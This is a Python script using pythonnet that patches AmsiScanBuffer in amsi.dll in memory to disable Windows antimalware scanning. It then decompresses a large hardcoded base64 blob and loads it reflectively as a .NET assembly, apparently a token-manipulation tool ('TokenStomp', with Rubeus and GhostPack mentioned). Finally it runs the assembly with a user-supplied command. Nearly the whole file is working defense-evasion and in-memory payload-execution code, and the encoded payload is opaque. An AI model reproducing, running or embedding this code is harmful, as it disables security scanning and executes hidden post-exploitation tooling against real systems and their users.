import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("TokenStomp.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()